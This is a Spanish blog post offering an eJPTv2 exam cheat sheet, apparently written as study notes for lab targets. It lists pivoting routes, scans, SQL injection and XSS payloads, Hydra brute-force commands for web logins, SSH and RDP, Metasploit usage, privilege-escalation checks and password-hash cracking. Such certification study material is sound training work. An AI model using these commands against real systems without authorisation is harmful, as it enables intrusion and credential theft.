---
title: "eJPTv2 Cheat Sheet: Cómo ir al examen sin miedo"
description: "Mi preparación para afrontar el examen de la conocida certificación eJPT."
pubDate: 2025-12-05
author: "Javier N. González"
categories: ['Certificaciones', 'Red Team']
tags: ["eJPT", "redteam", "pentesting"]
---

La reconocida certificación eJPT mide nuestra capacidad para enumerar redes desconocidas y pivotar manualmente mediante enrutamiento estático, además de dominar los fundamentos de Metasploit. Aquí te dejo mi “Cheat Sheet” o chuleta de referencia.

## Mi preparación para eJPTv2

Este esquema cubre el ciclo de vida de una auditoría para la certificación eJPT, lo he enfocado en la Metodología, Routing y Metasploit. Exactamente he dividido el examen en 6 fases o secciones, las cuales se muestran a continuación.

### 1. Networking & Routing
El objetivo de la primera fase es entender dónde estás y alcanzar las redes ocultas. A diferencia de otros exámenes, aquí debes configurar tu enrutamiento manual.

**Identificación de Red**
Ver tu IP y máscara:
```bash
ip a / ifconfig
```
Ver la tabla de rutas actual:
```bash
ip route
```

**Descubrimiento de Hosts (Ping Sweep)**
```bash
fping -a -g 192.168.1.0/24 2>/dev/null
```
Lo estándar:
```bash
nmap -sn 192.168.1.0/24
```

**Agregar Rutas (Pivoting Básico)**
Estamos en el escenario en el que hemos comprometido una máquina con dos interfaces.

Linux:
```bash
ip route add 10.10.10.0/24 via <IP_GATEWAY_INTERNA>
```
Windows:
```bash
route add 10.10.10.0 mask 255.255.255.0 <IP_GATEWAY>
```

---

### 2. Enumeración & Reconocimiento
El siguiente paso se centra en mapear puertos y servicios vulnerables.

**Nmap (Escaneo de Puertos)**
Scripts por defecto y versiones:
```bash
nmap -sC -sV -p- <IP>
```
No nos quedamos sólamente en el protocolo TCP y revisamos también UDP (común en eJPT para SNMP):
```bash
nmap -sU <IP>
```

**Web Enumeration (HTTP/HTTPS)**
Nikto (Vieja escuela pero útil para fallos de config):
```bash
nikto -h <URL>
```
Dirbusting:
```bash
gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```
Inspección Manual: Ver código fuente (Ctrl+U), `robots.txt`.

---

### 3. Web Attacks (Client-Side & Server-Side)
Llegamos a la fase donde debemos explotar aplicaciones web mal configuradas o vulnerables.

**SQL Injection (SQLi)**
Manual: Probar `' OR 1=1 -- -` en paneles de login.

SQLMap (Permitido y recomendado):
```bash
sqlmap -u "[http://target.com/page.php?id=1](http://target.com/page.php?id=1)" --dbs --batch
```

**Cross-Site Scripting (XSS)**
Reflejado: `<script>alert(1)</script>` en inputs de búsqueda.
Robo de Cookies: `document.cookie`.

**Brute Force Web**
Hydra:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```

---

### 4. System Attacks & Exploitation
Ganamos acceso al sistema mediante RCE (Remote Code Execution).

**Búsqueda de Vulnerabilidades**
```bash
searchsploit "nombre servicio versión"
```
Google Hacking: `"Apache 2.4.xx exploit github"`.

**Metasploit Framework (Muy importante en eJPT)**
```bash
search <servicio>
use exploit/...
set RHOSTS <IP>
check   # Verificar si es vulnerable antes de atacar.
exploit # Lanzar el ataque.
```

**Brute Force de Servicios**
SSH:
```bash
hydra -L users.txt -P pass.txt ssh://<IP>
```
RDP:
```bash
hydra -L users.txt -P pass.txt rdp://<IP>
```

---

### 5. Privilege Escalation
Aquí tendremos que elevar privilegios a SYSTEM (Windows) o Root (Linux).

**Windows PrivEsc**
Meterpreter (Intento automático):
```bash
getsystem
```
Enumeración Manual:
```bash
whoami /priv
net user <usuario> # (Ver grupos)
systeminfo # (Ver versión del SO y parches para Kernel Exploits)
```

**Linux PrivEsc**
Sudo (¿Qué puedo ejecutar como root sin contraseña?):
```bash
sudo -l
```
SUID (Buscar binarios con permisos especiales):
```bash
find / -perm -u=s -type f 2>/dev/null
```
Kernel (Buscar “Dirty Cow” u otros exploits viejos):
```bash
uname -a
```

---

### 6. Post-Exploitation
En esta fase el objetivo es encontrar las “banderas”, hashes o archivos finales.

**Búsqueda de Archivos (Linux)**
```bash
find / -name "flag.txt" 2>/dev/null
grep -r "password" /home/
```

**Búsqueda de Archivos (Windows)**
```cmd
dir /s flag.txt
type C:\Users\Administrator\Desktop\flag.txt
```

**Cracking de Hashes**
Si encuentras hashes en `/etc/shadow` o bases de datos:

John:
```bash
john --wordlist=rockyou.txt hash.txt
```
Hashcat:
```bash
hashcat -m <modo> -a 0 hash.txt rockyou.txt
```